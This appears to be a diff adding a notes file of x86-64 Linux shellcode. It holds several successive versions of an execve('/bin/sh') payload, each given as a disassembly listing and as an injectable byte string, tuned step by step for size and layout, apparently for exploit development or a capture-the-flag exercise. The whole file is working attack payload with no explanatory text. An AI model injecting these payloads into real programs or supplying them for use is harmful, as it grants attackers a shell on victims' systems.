@@ -1,0 +1,130 @@
+
+            0x00000540      ff34252f7368.  pushq 0x68732f              ; [11] -r-x section size 304 named .text
+        |   0x00000547      ff34252f6269.  pushq 0x6e69622f
+        |   0x0000054e      4889e7         movq %rsp, %rdi
+        |   0x00000551      4831f6         xorq %rsi, %rsi
+        |   0x00000554      4831d2         xorq %rdx, %rdx
+        |   0x00000557      4831c0         xorq %rax, %rax
+        |   0x0000055a      b03b           movb $0x3b, %al             ; ';'
+        |   0x0000055c      0f05           syscall
+       `=-> 0x0000055e      ebfe           jmp 0x55e
+---
+b"\xff\x34\x25\x2f\x73\x68\x00"
+b"\xff\x34\x25\x2f\x62\x69\x6e"
+b"\x48\x89\xe7"
+b"\x48\x31\xf6"
+b"\x48\x31\xd2"
+b"\x48\x31\xc0"
+b"\xb0\x3b"
+b"\x0f\x05"
+b"\xeb\xfe"
+---
+   0:   48 ba 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdx
+   7:   73 68 00 
+   a:   48 83 e8 10             sub    $0x10,%rax
+   e:   48 89 10                mov    %rdx,(%rax)
+  11:   48 89 c7                mov    %rax,%rdi
+  14:   48 31 f6                xor    %rsi,%rsi
+  17:   48 31 d2                xor    %rdx,%rdx
+  1a:   48 31 c0                xor    %rax,%rax
+  1d:   b0 3b                   mov    $0x3b,%al
+  1f:   0f 05                   syscall 
+
+0000000000000021 <inf>:
+  21:   eb fe                   jmp    21 <inf>
+---
+48ba2f62696e2f
+736800
+4883e810
+488910
+4889c7
+4831f6
+4831d2
+4831c0
+b03b
+0f05
+ebfe
+---
+b"\x48\xba\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x83\xe8\x10\x48\x89\x10\x48\x89\xc7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xeb\xfe"
+---
+   0:   48 ba 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdx
+   7:   73 68 00
+   a:   48 83 e8 10             sub    $0x10,%rax
+   e:   48 89 10                mov    %rdx,(%rax)
+  11:   48 89 c7                mov    %rax,%rdi
+  14:   48 83 e8 10             sub    $0x10,%rax
+  18:   48 89 38                mov    %rdi,(%rax)
+  1b:   48 89 c6                mov    %rax,%rsi
+  1e:   48 31 d2                xor    %rdx,%rdx
+  21:   48 31 c0                xor    %rax,%rax
+  24:   b0 3b                   mov    $0x3b,%al
+  26:   0f 05                   syscall
+---
+b"\x48\xba\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x83\xe8\x10\x48\x89\x10\x48\x89\xc7\x48\x83\xe8\x10\x48\x89\x38\x48\x89\xc6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
+---
+   0:   48 ba 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdx
+   7:   73 68 00
+   a:   48 83 e8 10             sub    $0x10,%rax
+   e:   48 89 10                mov    %rdx,(%rax)
+  11:   48 31 d2                xor    %rdx,%rdx
+  14:   48 83 e8 10             sub    $0x10,%rax
+  18:   48 89 10                mov    %rdx,(%rax)
+  1b:   48 89 c7                mov    %rax,%rdi
+  1e:   48 83 e8 10             sub    $0x10,%rax
+  22:   48 89 38                mov    %rdi,(%rax)
+  25:   48 89 c6                mov    %rax,%rsi
+  28:   48 31 c0                xor    %rax,%rax
+  2b:   b0 3b                   mov    $0x3b,%al
+  2d:   0f 05                   syscall
+---
+b"\x48\xba\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x83\xe8\x10\x48\x89\x10\x48\x31\xd2\x48\x83\xe8\x10\x48\x89\x10\x48\x89\xc7\x48\x83\xe8\x10\x48\x89\x38\x48\x89\xc6\x48\x31\xc0\xb0\x3b\x0f\x05\xeb\xfe";
+---
+   0:   48 ba 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdx
+   7:   73 68 00
+   a:   48 83 e8 10             sub    $0x10,%rax
+   e:   48 89 10                mov    %rdx,(%rax)
+  11:   48 89 c7                mov    %rax,%rdi
+  14:   48 31 d2                xor    %rdx,%rdx
+  17:   48 83 e8 10             sub    $0x10,%rax
+  1b:   48 89 10                mov    %rdx,(%rax)
+  1e:   48 83 e8 10             sub    $0x10,%rax
+  22:   48 89 38                mov    %rdi,(%rax)
+  25:   48 89 c6                mov    %rax,%rsi
+  28:   48 31 c0                xor    %rax,%rax
+  2b:   b0 3b                   mov    $0x3b,%al
+  2d:   0f 05                   syscall
+---
+b"\x48\xba\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x83\xe8\x10\x48\x89\x10\x48\x89\xc7\x48\x31\xd2\x48\x83\xe8\x10\x48\x89\x10\x48\x83\xe8\x10\x48\x89\x38\x48\x89\xc6\x48\x31\xc0\xb0\x3b\x0f\x05";
+---
+   0:   48 ba 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdx
+   7:   73 68 00
+   a:   48 83 e8 10             sub    $0x10,%rax
+   e:   48 89 10                mov    %rdx,(%rax)
+  11:   48 89 c7                mov    %rax,%rdi
+  14:   48 31 d2                xor    %rdx,%rdx
+  17:   48 83 e8 08             sub    $0x8,%rax
+  1b:   48 89 10                mov    %rdx,(%rax)
+  1e:   48 83 e8 08             sub    $0x8,%rax
+  22:   48 89 38                mov    %rdi,(%rax)
+  25:   48 89 c6                mov    %rax,%rsi
+  28:   48 31 c0                xor    %rax,%rax
+  2b:   b0 3b                   mov    $0x3b,%al
+  2d:   0f 05                   syscall
+---
+b"\x48\xba\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x83\xe8\x10\x48\x89\x10\x48\x89\xc7\x48\x31\xd2\x48\x83\xe8\x08\x48\x89\x10\x48\x83\xe8\x08\x48\x89\x38\x48\x89\xc6\x48\x31\xc0\xb0\x3b\x0f\x05"
+---
+   0:   2c 92                   sub    $0x92,%al
+   2:   48 89 10                mov    %rdx,(%rax)
+   5:   48 89 c7                mov    %rax,%rdi
+   8:   48 31 d2                xor    %rdx,%rdx
+   b:   2c 08                   sub    $0x8,%al
+   d:   48 89 10                mov    %rdx,(%rax)
+  10:   2c 08                   sub    $0x8,%al
+  12:   48 89 38                mov    %rdi,(%rax)
+  15:   48 89 c6                mov    %rax,%rsi
+  18:   48 31 c0                xor    %rax,%rax
+  1b:   b0 3b                   mov    $0x3b,%al
+  1d:   0f 05                   syscall
+---
+b"\x2c\x92\x48\x89\x10\x48\x89\xc7\x48\x31\xd2\x2c\x08\x48\x89\x10\x2c\x08\x48\x89\x38\x48\x89\xc6\x48\x31\xc0\xb0\x3b\x0f\x05";
+---
